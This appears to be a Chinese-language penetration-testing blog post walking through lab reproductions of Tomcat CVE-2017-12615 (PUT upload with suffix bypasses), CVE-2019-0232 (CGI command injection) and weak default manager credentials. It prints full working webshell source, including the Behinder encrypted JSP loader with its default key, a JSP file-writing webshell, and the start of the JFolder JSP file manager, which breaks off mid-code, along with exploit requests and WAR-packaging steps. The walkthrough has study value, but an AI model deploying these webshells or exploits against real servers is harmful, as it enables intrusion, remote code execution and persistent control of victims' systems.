title="Tomcat任意文件写入(CVE-2017-12615）"></a>Tomcat任意文件写入(CVE-2017-12615）</h3><h4 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h4><p>Apache Tomcat7.0.0-7.0.81（默认配置）</p><h4 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h4><p>这边我用vulhub</p><pre class="line-numbers language-none"><code class="language-none">sudo service docker start cd vulhub/tomcat/CVE-2017-12615sudo docker-compose buildsudo docker-compose up -d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718061951.png" alt="1619279493073"></p><p>去底层看看源码</p><pre class="line-numbers language-none"><code class="language-none">sudo docker pssudo docker exec -ti a3 bashcat conf/web.xml |grep readonly<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718061952.png" alt="1619279550159"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718061953.png" alt="1619279602920"></p><h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>产生是由于配置不当（非默认配置），将配置文件<code>conf/web.xml</code>中的 <code>readonly</code>设置为了 false，导致可以使用PUT方法上传任意文件，但限制了jsp后缀，不过对于不同平台有多种绕过方法</p><h4 id="开始复现"><a href="#开始复现" class="headerlink" title="开始复现"></a>开始复现</h4><p>抓包  改位PUT  上传方式</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718061954.png" alt="1619279695848"></p><p>去上传目录看看</p><pre class="line-numbers language-none"><code class="language-none">/usr/local/tomcat/webapps/ROOT<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718061955.png" alt="1619279779246"></p><p>成功上传</p><h5 id="绕过，成功上传jsp"><a href="#绕过，成功上传jsp" class="headerlink" title="绕过，成功上传jsp"></a>绕过，成功上传jsp</h5><pre class="line-numbers language-none"><code class="language-none">1.Windows下不允许文件以空格结尾以PUT /a001.jsp%20 HTTP/1.1上传到 Windows会被自动去掉末尾空格2.WindowsNTFS流Put/a001.jsp::$DATA HTTP/1.13. /在文件名中是非法的，也会被去除（Linux/Windows）Put/a001.jsp/http:/1.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到上传a001.jsp 是成功绕过了</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718061956.png" alt="1619280114887"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718061957.png" alt="1619280208227"></p><p>其他两种我就不进行演示了 </p><p>都是可以的</p><p>上传马儿，这边我用冰蝎进行连接</p><p><strong>注意：不能开代理</strong></p><p>看看冰蝎server目录下的jsp马儿</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718061958.png" alt="1619280600919"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718061959.png" alt="1619280689842"></p><p>冰蝎的jsp马儿</p><pre class="line-numbers language-none"><code class="language-none">&lt;%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%&gt;&lt;%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%&gt;&lt;%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注意这边要用<code>/</code>进行绕过,上传jsp</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062000.png" alt="1619281552614"></p><p>也可以看到是成功上传的</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062001.png" alt="1619281576850"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062002.png" alt="1619281594138"></p><p>用冰蝎进行连接一下</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062003.png" alt="1619281681804"></p><h5 id="最新版本复现"><a href="#最新版本复现" class="headerlink" title="最新版本复现"></a>最新版本复现</h5><p>这边把这个漏洞的代码 粘贴进最新的版本</p><p>不加的话  PUT 上传txt都是不可以的</p><pre class="line-numbers language-none"><code class="language-none">&lt;init-param&gt; &lt;param-name&gt;readonly&lt;/param-name&gt; &lt;param-value&gt;false&lt;/param-value&gt;&lt;/init-param&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062004.png" alt="1619316374088"></p><p>保存退出 进行重启Tomcat</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062005.png" alt="1619316427883"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062006.png" alt="1619316466768"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062007.png" alt="1619316534173"></p><p>确实是可以成功写入的</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062008.png" alt="1619316568424"></p><p>进行PUT写入txt 发现它是可以的</p><p>但是绕过，上传jsp  三种方法我都试了  是不行的</p><h5 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h5><p>把readonly 改成true</p><pre class="line-numbers language-none"><code class="language-none">&lt;init-param&gt; &lt;param-name&gt;readonly&lt;/param-name&gt; &lt;param-value&gt;false&lt;/param-value&gt;&lt;/init-param&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Tomcat远程代码执行（CVE-2019-0232）"><a href="#Tomcat远程代码执行（CVE-2019-0232）" class="headerlink" title="Tomcat远程代码执行（CVE-2019-0232）"></a>Tomcat远程代码执行（CVE-2019-0232）</h3><h4 id="影响范围-1"><a href="#影响范围-1" class="headerlink" title="影响范围"></a>影响范围</h4><pre class="line-numbers language-none"><code class="language-none">Apache Tomcat 9.0.0.M1 to 9.0.17Apache Tomcat 8.5.0 to 8.5.39Apache Tomcat 7.0.0 to 7.0.93<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这边就用 Windows 8.5.39 进行复现</p><h4 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h4><p>同样是先安装java</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062009.png" alt="1619317164402"></p><p>然后安装Tomcat</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062010.png" alt="1619317181551"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062011.png" alt="1619317197793"></p><p>访问一下</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062012.png" alt="1619317352951"></p><h4 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>漏洞相关的代码在 <code>tomcat\java\org\apache\catalina\servlets\CGIServlet.java</code>中，CGISerlvet提供了一个<code>cgi</code>的调用接口，在启用<code>enableCmdLineArguments</code>参数时，会根据<code>RFC 3875</code>来从Url参数中生成命令行参数，并把参数传递至Java的 <code>Runtime</code>执行。</p><p><strong>这个漏洞是因为<code>Runtime.getRuntime().exec</code>在 Windows中和 Linux中底层实现不同导致的</strong></p><p>Java的Runtime.getRuntime().exec在CGI调用这种情况下很难有命令注入。</p><p>而 Windows中创建进程使用的是 CreateProcess，会将参数合并成字符串，作为 <code>lpComandLine</code>传入 CreateProcess。程序启动后调用<code> GetcommandLine</code>获取参数，并调用<code>CommandLineToArgw</code>传至argv</p><p>在 Windows中，当<code>CreateProcess</code>中的参数为bat文件或是cmd文件时，会调用 cmd.exe，故最后会变成<code>cmd.exe /c "a001.bat dir"</code>，而Java的调用过程并没有做任何的转义，所以在 Windows下会存在漏洞。</p><p>除此之外，Windows在处理参数方面还有一个特性，如果这里只加上简单的转义还是可能被绕过</p><p>例如<code>dir "\"&amp;whoami"</code>在 Linux中是安全的，而在Windows会执行命令。<br>这是因为 Windows在处理命令行参数时，会将<code>"</code>中的内容拷贝为下一个参数，直到命令行结束或者遇到下一个<code>"</code>，但是对<code>"</code>的处理有误。因此在Java中调用批处理或者cmd文件时，需要做合适的参数检査才能避免漏洞岀现。</p><h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>Tomcat的 CGI_Servlet组件默认是关闭的，在<code>conf/web.xml</code>中找到注释的 CGIServlet部分，去掉注释，并配置 enableCmdLineArguments和executable</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062013.png" alt="1619326835356"></p><p>就是配置这里</p><pre class="line-numbers language-none"><code class="language-none">&lt;servlet&gt;    &lt;servlet-name&gt;cgi&lt;/servlet-name&gt;    &lt;servlet-class&gt;org.apache.catalina.servlets.CGIServlet&lt;/servlet-class&gt;    &lt;init-param&gt;        &lt;param-name&gt;cgiPathPrefix&lt;/param-name&gt;        &lt;param-value&gt;WEB-INF/cgi&lt;/param-value&gt;    &lt;/init-param&gt;&lt;init-param&gt;        &lt;param-name&gt;enableCmdLineArguments&lt;/param-name&gt;&lt;param-value&gt;true&lt;/param-value&gt;&lt;/init-param&gt;&lt;init-param&gt;    &lt;param-name&gt;executable&lt;/param-name&gt;    &lt;param-value&gt;&lt;/param-value&gt;&lt;/init-param&gt;    &lt;load-on-startup&gt;5&lt;/load-on-startup&gt;&lt;/servlet&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里主要的设置是enableCmdLineArguments和 executable两个选项</p><pre class="line-numbers language-none"><code class="language-none">1.enableCmdLineArguments启用后才会将Url中的参数传递到命令行2.executable指定了执行的二进制文件，默认是perl，需要置为空才会执行文件本身。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>同样在conf/web.xml中启用cgi的 servlet-mapping</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062014.png" alt="1619326964457"></p><p>修改conf/context.xml的添加 privileged=”true”属性，否则会没有权限</p><pre class="line-numbers language-none"><code class="language-none">&lt;Context privileged="true"&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062015.png" alt="1619327075870"></p><p>配置目录文件</p><p>在<code>C:\Tomcat\webapps\ROOT\WEB-INF</code>下创建<code>cgi-bin</code>目录</p><p>并在该目录下创建一个a001.txt</p><p>里面内容随意</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062016.png" alt="1619327411223"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062017.png" alt="1619327400322"></p><p>记得重启一下</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062018.png" alt="1619327485133"></p><p>然后我们访问</p><pre class="line-numbers language-none"><code class="language-none">http://192.168.175.193:8080/cgi-bin/a001.bat?&amp;dir<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到成功任意代码执行！</p><h4 id="修复方式"><a href="#修复方式" class="headerlink" title="修复方式"></a>修复方式</h4><p>开发者在 patch中增加了 <code>cmdLineArgumentsDecoded</code>参数，这个参数用来校验传入的命令行参数，如果传入的命令行参数不符合规定的模式，则不执行。<br>校验写在 setupFromRequest函数中</p><pre class="line-numbers language-none"><code class="language-none">String decodedArgument = URLDecoder.decode(encodedArgument, parameterEncoding);if (cmdLineArgumentsDecodedPattern != null &amp;&amp; !cmdLineArgumentsDecodedPattern.matcher(decodedArgument).matches()) { if (log.isDebugEnabled()) { log.debug(sm.getString("cgiServlet.invalidArgumentDecoded", decodedArgument, cmdLineArgumentsDecodedPattern.toString())); } return false;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>不通过时，会将 CGIEnvironment的<code>valid</code>参数设为 false，在之后的处理函数中会直接跳过执行</p><pre class="line-numbers language-none"><code class="language-none">if (cgiEnv.isValid()) { CGIRunner cgi = new CGIRunner(cgiEnv.getCommand(), cgiEnv.getEnvironment(), cgiEnv.getWorkingDirectory(), cgiEnv.getParameters()); if ("POST".equals(req.getMethod())) { cgi.setInput(req.getInputStream()); } cgi.setResponse(res); cgi.run();} else { res.sendError(404);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h4><pre class="line-numbers language-none"><code class="language-none">1.使用更新版本的 Apache Tomcat。这里需要注意的是，虽然在9.0.18就修复了这个漏洞，但这个更新是并没有通过候选版本的投票，所以虽然9.0.18没有在被影响的列表中，用户仍需要下载9.0.19的版本来获得没有该漏洞的版本2.关闭 enableCmdLineArguments参数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="Tomcat弱口令-amp-后台getshell漏洞"><a href="#Tomcat弱口令-amp-后台getshell漏洞" class="headerlink" title="Tomcat弱口令&amp;后台getshell漏洞"></a>Tomcat弱口令&amp;后台getshell漏洞</h3><h4 id="影响范围-2"><a href="#影响范围-2" class="headerlink" title="影响范围"></a>影响范围</h4><p>Tomcat8</p><p>这边就还是用vulhub进行复现</p><pre class="line-numbers language-none"><code class="language-none">cd vulhub-master/tomcat/tomcat8sudo docker-compose up -d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062019.png" alt="1619329013757"></p><p>之前的容器要关掉</p><p>去docker底层看看它的源码</p><pre class="line-numbers language-none"><code class="language-none">sudo docker pssudo docker exec -ti a bashcd conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>把这三个文件复制出来</p><pre class="line-numbers language-none"><code class="language-none">sudo docker cp 5e81d6d51622:/usr/local/tomcat/conf/tomcat-users.xml /home/dayu/Desktop/sudo docker cp 5e81d6d51622:/usr/local/tomcat/conf/tomcat-users.xsd /home/dayu/Desktop/sudo docker cp 5e81d6d51622:/usr/local/tomcat/conf/web.xml /home/dayu/Desktop/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062020.png" alt="1619329131808"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062021.png" alt="1619329484692"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062022.png" alt="1619329494731"></p><p>源码</p><pre class="line-numbers language-none"><code class="language-none">&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;tomcat-users xmlns="http://tomcat.apache.org/xml" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd" version="1.0"&gt; &lt;role rolename="manager-gui"/&gt; &lt;role rolename="manager-script"/&gt; &lt;role rolename="manager-jmx"/&gt; &lt;role rolename="manager-status"/&gt; &lt;role rolename="admin-gui"/&gt; &lt;role rolename="admin-script"/&gt; &lt;user username="tomcat" password="tomcat" roles="manager-gui,manager-script,manager-jmx,manager-status,admin-gui,admin-script" /&gt; &lt;/tomcat-users&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>manager（后台管理）</p><pre class="line-numbers language-none"><code class="language-none">manager-gui     拥有htmL页面权限manager-status  拥有查看 status的权限manager-script  拥有text接口的权限，和 status权限manager-jmx     拥有jmx权限，和 status权限<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>host-manager（虚拟主机管理</p><pre class="line-numbers language-none"><code class="language-none">admin-gui    拥有html页面权限admin-script 拥有text接口权限<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>访问一下</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062023.png" alt="1619329569867"></p><p>访问一下它的后台管理地址</p><pre class="line-numbers language-none"><code class="language-none">/manager/html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062024.png" alt="1619329613901"></p><p>或者点这里</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062025.png" alt="1619329717080"></p><p>它的登录窗口是没有验证码的  直接爆破就可以</p><p>默认</p><pre class="line-numbers language-none"><code class="language-none">Users：TomcatPasswd：Tomcat<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>登录进去之后 进行查看</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062026.png" alt="1619329890433"></p><p><strong>为什么需要上传wa包，为什么不是 tar.zip？？</strong></p><p>war包是用来进行Web开发时一个网站项目下的所有代码，包括前台HTML/CSS/JS代码，以及后台 JavaWeb的代码。当开发人员开发完毕时，就会将源码打包给测试人员测试，测试完后若要发布则也会打包成War包进行发布。War包可以放在Tomcat下的webapps或word目录，当Tomcat服务器启动时，War包即会随之解压源代码来进行自动部署。</p><p>上传JSP的大马</p><pre class="line-numbers language-none"><code class="language-none">&lt;%@page contentType="text/html;charset=gb2312"%&gt;    &lt;%@page import="java.io.*,java.util.*,java.net.*"%&gt;    &lt;html&gt;      &lt;head&gt;        &lt;title&gt;&lt;/title&gt;        &lt;style type="text/css"&gt;         body { color:red; font-size:12px; background-color:white; }        &lt;/style&gt;      &lt;/head&gt;      &lt;body&gt;      &lt;%       if(request.getParameter("context")!=null)       {       String context=new String(request.getParameter("context").getBytes("ISO-8859-1"),"gb2312");       String path=new String(request.getParameter("path").getBytes("ISO-8859-1"),"gb2312");       OutputStream pt = null;            try {                pt = new FileOutputStream(path);                pt.write(context.getBytes());                out.println("&lt;a href='"+request.getScheme()+"://"+request.getServerName()+":"+request.getServerPort()+request.getRequestURI()+"'&gt;&lt;font color='red' title='点击可以转到上传的文件页面!'&gt;上传成功!&lt;/font&gt;&lt;/a&gt;");            } catch (FileNotFoundException ex2) {                out.println("&lt;font color='red'&gt;上传失败!&lt;/font&gt;");            } catch (IOException ex) {                out.println("&lt;font color='red'&gt;上传失败!&lt;/font&gt;");            } finally {                try {                    pt.close();                } catch (IOException ex3) {                    out.println("&lt;font color='red'&gt;上传失败!&lt;/font&gt;");                }            }    }      %&gt;        &lt;form name="frmUpload" method="post" action=""&gt;        &lt;font color="blue"&gt;本文件的路径:&lt;/font&gt;&lt;%out.print(request.getRealPath(request.getServletPath())); %&gt;        &lt;br&gt;        &lt;br&gt;        &lt;font color="blue"&gt;上传文件路径:&lt;/font&gt;&lt;input type="text" size="70" name="path" value="&lt;%out.print(getServletContext().getRealPath("/")); %&gt;"&gt;        &lt;br&gt;        &lt;br&gt;        上传文件内容:&lt;textarea name="context" id="context" style="width: 51%; height: 150px;"&gt;&lt;/textarea&gt;        &lt;br&gt;        &lt;br&gt;        &lt;input type="submit" name="btnSubmit" value="Upload"&gt;        &lt;/form&gt;      &lt;/body&gt;    &lt;/html&gt;   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>zip压缩 然后改后缀 成war的包</p><p>或者使用Java命令：</p><pre class="line-numbers language-none"><code class="language-none">jar -cvf dayu.war dayu.jsp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062027.png" alt="1619339840138"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062028.png" alt="1619339862773"></p><p>这里的<code>/2</code> 就是war包的名字</p><p>去docker底层看看是否成功上传</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062029.png" alt="1619339911577"></p><p> 它会自动部署  那我们访问一下</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062030.png" alt="1619332041600"></p><p>成功解析jsp大马，并能 upload上传功能！</p><p>这里上传冰蝎的jsp马儿</p><pre class="line-numbers language-none"><code class="language-none">&lt;%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%&gt;&lt;%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%&gt;&lt;%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062031.png" alt="1619340379288"></p><p>upload之后 上冰蝎进行连接</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062032.png" alt="1619340324001"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062033.png" alt="1619340439690"></p><p>在贴一个牛逼的JSP大马</p><pre class="line-numbers language-none"><code class="language-none">&lt;%/**JFolder V0.9  windows platform@Filename： JFolder.jsp @Description： 一个简单的系统文件目录显示程序，类似于资源管理器，提供基本的文件操作，不过功能较弱。@Bugs  :  下载时，中文文件名无法正常显示*/%&gt;&lt;%@ page contentType="text/html;charset=gb2312"%&gt;&lt;%@page import="java.io.*,java.util.*,java.net.*" %&gt;&lt;%!private final static int languageNo=0; //语言版本，0 : 中文； 1：英文String strThisFile="JFolder.jsp";String[] authorInfo={" &lt;font color=red&gt; 岁月联盟-专用版 &lt;/font&gt;"," &lt;font color=red&gt; Thanks for your support - - by Steven Cee http:// &lt;/font&gt;"};String[] strFileManage   = {"文 件 管 理","File Management"};String[] strCommand      = {"CMD 命 令","Command Window"};String[] strSysProperty  = {"系 统 属 性","System Property"};String[] strHelp         = {"帮 助","Help"};String[] strParentFolder = {"上级目录","Parent Folder"};String[] strCurrentFolder= {"当前目录","Current Folder"};String[] strDrivers      = {"驱动器","Drivers"};String[] strFileName     = {"文件名称","File Name"};String[] strFileSize     = {"文件大小","File Size"};String[] strLastModified = {"最后修改","Last Modified"};String[] strFileOperation= {"文件操作","Operations"};String[] strFileEdit     = {"修改","Edit"};String[] strFileDown     = {"下载","Download"};String[] strFileCopy     = {"复制","Move"};String[] strFileDel      = {"删除","Delete"};String[] strExecute      = {"执行","Execute"};String[] strBack         = {"返回","Back"};String[] strFileSave     = {"保存","Save"};public class FileHandler{ private String strAction=""; private String strFile=""; void FileHandler(String action,String f) {  }}public static class UploadMonitor {  static Hashtable uploadTable = new Hashtable();  static void set(String fName, UplInfo info) {   uploadTable.put(fName, info);  }  static void remove(String fName) {   uploadTable.remove(fName);  }  static UplInfo getInfo(String fName) {   UplInfo info = (UplInfo) uploadTable.get(fName);   return info;  }}public class UplInfo {  public long totalSize;  public long currSize;  public long starttime;  public boolean aborted;  public UplInfo() {   totalSize = 0l;   currSize = 0l;   starttime = System.currentTimeMillis();   aborted = false;  }  public UplInfo(int size) {   totalSize = size;   currSize = 0;   starttime = System.currentTimeMillis();   aborted = false;  }  public String getUprate() {   long time = System.currentTimeMillis() - starttime;   if (time != 0) {    long uprate = currSize * 1000 / time;    return convertFileSize(uprate) + "/s";   }   else return "n/a";  }  public int getPercent() {   if (totalSize == 0) return 0;   else return (int) (currSize * 100 / totalSize);  }  public String getTimeElapsed() {   long time = (System.currentTimeMillis() - starttime) / 1000l;   if (time - 60l &gt;= 0){    if (time % 60 &gt;=10) return time / 60 + ":" + (time % 60) + "m";    else return time / 60 + ":0" + (time % 60) + "m";   }   else return time&lt;10 ? "0" + time + "s": time + "s";  }  public String getTimeEstimated() {   if (currSize == 0) return "n/a";   long time = System.currentTimeMillis() - starttime;   time = totalSize * time / currSize;   time /= 1000l;   if (time - 60l &gt;= 0){    if (time % 60 &gt;=10) return time / 60 + ":" + (time % 60) + "m";    else return time / 60 + ":0" + (time % 60) + "m";   }   else return time&lt;10 ? "0" + time + "s": time + "s";  } } public class FileInfo {  public String name = null, clientFileName = null, fileContentType = null;  private byte[] fileContents = null;  public File file = null;  public StringBuffer sb = new StringBuffer(100);  public void setFileContents(byte[] aByteArray) {   fileContents = new byte[aByteArray.length];   System.arraycopy(aByteArray, 0, fileContents, 0, aByteArray.length);  }}// A Class with methods used to process a ServletInputStreampublic class HttpMultiPartParser {  private final String lineSeparator = System.getProperty("line.separator", "\n");  private final int ONE_MB = 1024 * 1;  public Hashtable processData(ServletInputStream is, String boundary, String saveInDir,    int clength) throws IllegalArgumentException, IOException {   if (is == null) throw new IllegalArgumentException("InputStream");   if (boundary == null || boundary.trim().length() &lt; 1) throw new IllegalArgumentException(     "\"" + boundary + "\" is an illegal boundary indicator");   boundary = "--" + boundary;   StringTokenizer stLine = null, stFields = null;   FileInfo fileInfo = null;   Hashtable dataTable = new Hashtable(5);   String line = null, field = null, paramName = null;   boolean saveFiles = (saveInDir != null &amp;&amp; saveInDir.trim().length() &gt; 0);   boolean isFile = false;   if (saveFiles) { // Create the required directory (including parent dirs)    File f = new File(saveInDir);    f.mkdirs();   }   line = getLine(is);   if (line == null || !line.startsWith(boundary)) throw new IOException(     "Boundary not found; boundary = " + boundary + ", line = " + line);   while (line != null) {    if (line == null || !line.startsWith(boundary)) return dataTable;    line = getLine(is);    if (line == null) return dataTable;    stLine = new StringTokenizer(line, ";\r\n");    if (stLine.countTokens() &lt; 2) throw new IllegalArgumentException(      "Bad data in second line");    line = stLine.nextToken().toLowerCase();    if (line.indexOf("form-data") &lt; 0) throw new IllegalArgumentException(      "Bad data in second line");    stFields = new StringTokenizer(stLine.nextToken(), "=\"");    if (stFields.countTokens() &lt; 2) throw new IllegalArgumentException(      "Bad data in second line");    fileInfo = new FileInfo();    stFields.nextToken();    paramName = stFields.nextToken();    isFile = false;    if (stLine.hasMoreTokens()) {     field = stLine.nextToken();     stFields = new StringTokenizer(field, "=\"");     if (stFields.countTokens() &gt; 1) {      if (stFields.nextToken().trim().equalsIgnoreCase("filename")) {       fileInfo.name = paramName;       String value = stFields.nextToken();       if (value != null &amp;&amp; value.trim().length() &gt; 0) {        fileInfo.clientFileName = value;        isFile = true;       }       else {        line = getLine(is); // Skip "Content-Type:" line        line = getLine(is); // Skip blank line        line = getLine(is); // Skip blank line        line = getLine(is); // Position to boundary line        continue;       }      }     }     else if (field.toLowerCase().indexOf("filename") &gt;= 0) {      line = getLine(is); // Skip "Content-Type:" line      line = getLine(is); // Skip blank line      line = getLine(is); // Skip blank line      line = getLine(is); // Position to boundary line      continue;     }    }    boolean skipBlankLine = true;    if (isFile) {     line = getLine(is);     if (line == null) return dataTable;     if (line.trim().length() &lt; 1) skipBlankLine = false;     else {      stLine = new StringTokenizer(line, ": ");      if (stLine.countTokens() &lt; 2) throw new IllegalArgumentException(        "Bad data in third line");      stLine.nextToken(); // Content-Type      fileInfo.fileContentType = stLine.nextToken();     }    }if (skipBlankLine) {     line = getLine(is);     if (line == null) return dataTable;    }    if (!isFile) {     line = getLine(is);     if (line == null) return dataTable;     dataTable.put(paramName, line);     // If parameter is dir, change saveInDir to dir     if (paramName.equals("dir")) saveInDir = line;     line = getLine(is);     continue;    }    try {     UplInfo uplInfo = new UplInfo(clength);     UploadMonitor.set(fileInfo.clientFileName, uplInfo);     OutputStream os = null;     String path = null;     if (saveFiles) os = new FileOutputStream(path = getFileName(saveInDir,       fileInfo.clientFileName));     else os = new ByteArrayOutputStream(ONE_MB);     boolean readingContent = true;     byte previousLine[] = new byte[2 * ONE_MB];     byte temp[] = null;     byte currentLine[] = new byte[2 * ONE_MB];     int read, read3;     if ((read = is.readLine(previousLine, 0, previousLine.length)) == -1) {      line = null;      break;     }     while (readingContent) {      if ((read3 = is.readLine(currentLine, 0, currentLine.length)) == -1) {       line = null;       uplInfo.aborted = true;       break;      }      if (compareBoundary(boundary, currentLine)) {       os.write(previousLine, 0, read - 2);       line = new String(currentLine, 0, read3);       break;      }      else {       os.write(previousLine, 0, read);       uplInfo.currSize += read;       temp = currentLine;       currentLine = previousLine;       previousLine = temp;       read = read3;      }//end else     }//end while     os.flush();     os.close();     if (!saveFiles) {      ByteArrayOutputStream baos = (ByteArrayOutputStream) os;      fileInfo.setFileContents(baos.toByteArray());     }     else fileInfo.file = new File(path);     dataTable.put(paramName, fileInfo);     uplInfo.currSize = uplInfo.totalSize;    }//end try    catch (IOException e) {     throw e;    }   }   return dataTable;  }  /**  